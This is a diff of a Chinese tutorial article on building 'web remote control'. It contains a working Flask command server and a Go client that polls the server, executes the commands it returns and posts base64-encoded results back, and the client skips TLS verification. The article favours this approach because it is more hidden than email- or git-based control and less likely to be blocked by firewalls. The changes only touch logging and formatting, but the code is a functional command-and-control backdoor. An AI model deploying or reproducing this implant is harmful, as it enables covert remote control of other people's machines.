@@ -3,12 +3,13 @@
 需要一台服务器,如果部署在公网,还需要一个公网ip.相对于邮箱和git,web远控最大的优点在于安全和隐蔽,前两者端口固定,容易被防火墙拦截,且密钥和密码写在源代码中,一旦被破解全部都要遭殃,而web更灵活,也更方便
 ### 服务端
 ```python
-#!/usr/bin/python
+#!/usr/bin/python3
 # -*- coding:utf-8 -*-
+
 import os, logging, re, time, base64
 os.chdir(os.path.split(os.path.realpath(__file__))[0])
 logging.basicConfig(
-    level=logging.INFO,
+    level=logging.WARNING,
     format='%(asctime)s[runtime:%(relativeCreated)d]~'
     '%(filename)s[line:%(lineno)d]~%(levelname)s~%(message)s',
     filename='r.log')
@@ -19,7 +20,7 @@ app = Flask(__name__)
 @app.before_request
 def before_request():
     # 记录当前请求
-    logging.info({
+    logging.warning({
         'headers':
         dict(request.headers),
         'url':
@@ -33,15 +34,15 @@ def before_request():
 def check_args(userid, stamp):
     # userid不能用数字字母以外的其他字符
     if re.findall('[^a-zA-Z0-9]', userid):
-        logging.info(f'illegal character "{userid}"')
+        logging.warning('illegal character "%s"' % userid)
         abort(404)
     if not os.path.exists(userid):
-        logging.info(f'path "{userid}" does not exist')
+        logging.warning('path "%s" does not exist' % userid)
         abort(404)
     # stamp用于区分请求.
     # 每次请求命令和返回结果都用同一个stamp,且只能是7位数字
     if re.findall('[^0-9]', stamp) or len(stamp) != 7:
-        logging.info(f'illegal stamp "{stamp}"')
+        logging.warning('illegal stamp "%s"' % stamp)
         abort(404)
 
 
@@ -50,19 +51,20 @@ def gf8hts():
     userid = request.args.get('u', '_')
     stamp = request.args.get('s', '0')
     check_args(userid, stamp)
+
     # 遍历目录,找到第一个txt结尾的文件,读取文件返回,并重命名为: 时间戳_stamp.cmd
     for r, _, f in os.walk(userid):
         for fl in f:
             if fl.endswith('.txt'):
                 path = os.path.join(r, fl)
-                logging.info(f'find {path}')
+                logging.warning('find %s' % path)
                 try:
                     c = open(path).read()
                     os.rename(path,
-                              os.path.join(
-                                  r, f'{int(time.time() * 1000)}_{stamp}.cmd'))
+                              os.path.join(r, '%d_%s.cmd' %
+                                           (time.time() * 1000, stamp)))
                 except:
-                    logging.info('read file error')
+                    logging.warning('read file error')
                     abort(404)
                 return c
     abort(404)
@@ -74,16 +76,15 @@ def raev0k():
     stamp = request.args.get('s', '0')
     check_args(userid, stamp)
 
-    # 有上传任意文件的风险,无法避免
     for r, _, f in os.walk(userid):
         for fl in f:
-            if fl.endswith(f'_{stamp}.cmd'):
+            if fl.endswith('_%s.cmd' % stamp):
                 res = os.path.join(r, fl.replace('.cmd', '.res'))
                 # 当存在某个还没有被回复的stamp文件时,以它命名,否则不写入
                 if not os.path.exists(res):
                     c = base64.b64decode(request.form.get(
                         'r', 'eA==')).decode('utf-8')
-                    if c.startswith(f'{stamp}'):
+                    if c.startswith(stamp):
                         open(res, 'w').write(c)
                     abort(404)
     abort(404)
@@ -122,6 +123,7 @@ import (
 
 func main() {
 	id := "theone"
+	resurl := "https://127.0.0.1:54321/"
 
 	// 进入当前目录
 	os.Chdir(filepath.Dir(os.Args[0]))
@@ -129,7 +131,7 @@ func main() {
 	// 发起请求
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	stamp := string([]rune(strconv.FormatInt((time.Now().UnixNano() / 1e8), 10))[4:])
-	resp, _ := http.Get("https://127.0.0.1:54321/gf8hts?u=" + id + "&s=" + stamp)
+	resp, _ := http.Get(resurl + "gf8hts?u=" + id + "&s=" + stamp)
 	defer resp.Body.Close()
 	body, _ := ioutil.ReadAll(resp.Body)
 	c := strings.Split(strings.Replace(string(body), "\r\n", "\n", -1), "\n")
@@ -159,7 +161,7 @@ func main() {
 	ans := stamp + "\n" + string(out)
 
 	// 返回结果
-	resp, _ = http.PostForm("https://127.0.0.1:54321/raev0k?u="+id+"&s="+stamp, url.Values{"r": {base64.StdEncoding.EncodeToString([]byte(ans))}})
+	resp, _ = http.PostForm(resurl+"raev0k?u="+id+"&s="+stamp, url.Values{"r": {base64.StdEncoding.EncodeToString([]byte(ans))}})
 	defer resp.Body.Close()
 }
 ```
